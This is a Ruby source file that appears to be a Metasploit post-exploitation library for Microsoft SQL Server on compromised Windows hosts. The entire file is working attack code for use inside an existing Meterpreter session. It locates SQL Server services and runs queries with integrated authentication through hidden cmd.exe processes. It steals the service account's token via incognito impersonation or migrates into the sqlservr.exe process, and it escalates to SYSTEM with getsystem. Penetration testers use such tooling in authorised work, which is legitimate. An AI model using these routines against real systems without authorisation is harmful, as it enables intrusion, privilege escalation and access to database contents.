# -*- coding: binary -*-
require 'msf/core/post/windows/services'
require 'msf/core/post/windows/priv'
require 'msf/core/exploit/mssql_commands'

module Msf
class Post
module Windows

module MSSQL

  attr_accessor :sql_client

  include Msf::Exploit::Remote::MSSQL_COMMANDS
  include Msf::Post::Windows::Services
  include Msf::Post::Windows::Priv

  def check_for_sqlserver(instance=nil)
    target_service = nil
    each_service do |service|
      unless instance.to_s.strip.empty?
        if service[:display].downcase.include?(instance.downcase) &&
          service[:pid].to_i > 0
          target_service = service
          break
        end
      else
        # Target default instance
        if service[:display] =~ /SQL Server \(| MSSQLSERVER/i &&
          service[:pid].to_i > 0
          target_service = service
          break
        end
      end
    end

    if target_service
      target_service.merge!(service_info(target_service[:name]))
    end

    return target_service
  end

  def get_sql_client
    client = nil

    if check_sqlcmd
      client = 'sqlcmd'
    elsif check_osql
      client = 'osql'
    end

    @sql_client = client
    return client
  end

  def check_osql
    running_services1 = run_cmd("osql -?")
    services_array1 = running_services1.split("\n")
    return services_array1.join =~ /(SQL Server Command Line Tool)|(usage: osql)/
  end

  def check_sqlcmd
    running_services = run_cmd("sqlcmd -?")
    services_array = running_services.split("\n")
    services_array.each do |service|
      if service =~ /SQL Server Command Line Tool/
        return true
      end
    end
  end

  def run_sql(query, instance=nil, server='.')
    target = server
    if instance && instance.downcase != 'mssqlserver'
      target = "#{server}\\#{instance}"
    end
    cmd = "#{@sql_client} -E -S #{target} -Q \"#{query}\" -h-1 -w 200"
    vprint_status(cmd)
    run_cmd(cmd)
  end

  ## ----------------------------------------------
  ## Method for executing cmd and returning the response
  ##
  ## Note: This may fail as SYSTEM if the current process
  ## doesn't have sufficient privileges to duplicate a token,
  ## e.g. SeAssignPrimaryToken
  ##----------------------------------------------
  def run_cmd(cmd, token=true)
    opts = {'Hidden' => true, 'Channelized' => true, 'UseThreadToken' => token}
    process = session.sys.process.execute("cmd.exe /c #{cmd}", nil, opts)
    res = ""
    while (d = process.channel.read)
      break if d == ""
      res << d
    end
    process.channel.close
    process.close

    res
  end

  def impersonate_sql_user(service)
    pid = service[:pid]
    vprint_status("Current user: #{session.sys.config.getuid}")
    current_privs = client.sys.config.getprivs
    if current_privs.include?('SeImpersonatePrivilege') ||
       current_privs.include?('SeTcbPrivilege') ||
       current_privs.include?('SeAssignPrimaryTokenPrivilege')
      username = nil
      session.sys.process.each_process do |process|
        if process['pid'] == pid
          username = process['user']
          break
        end
      end

      session.core.use('incognito') unless session.incognito
      vprint_status("Attemping to impersonate user: #{username}")
      res = session.incognito.incognito_impersonate_token(username)

      if res =~ /Successfully/i
        print_good("Impersonated user: #{username}")
        return true
      else
        return false
      end
    else
      # Attempt to migrate to target sqlservr.exe process
      # Migrating works, but I can't rev2self after its complete
      print_warning("No SeImpersonatePrivilege, attempting to migrate to process #{pid}...")
      begin
        session.core.migrate(pid)
      rescue Rex::RuntimeError => e
        print_error(e.to_s)
        return false
      end

      vprint_status("Current user: #{session.sys.config.getuid}")
      print_good("Successfully migrated to sqlservr.exe process #{pid}")
    end

    true
  end

  def get_system
    print_status("Checking if user is SYSTEM...")

    if is_system?
      print_good("User is SYSTEM")
    else
      # Attempt to get LocalSystem privileges
      print_warning("Attempting to get SYSTEM privileges...")
      system_status = session.priv.getsystem
      if system_status && system_status.first
        print_good("Success, user is now SYSTEM")
        return true
      else
        print_error("Unable to obtained SYSTEM privileges")
        return false
      end
    end
  end

end # MSSQL
end # Windows
end # Post
end # Msf
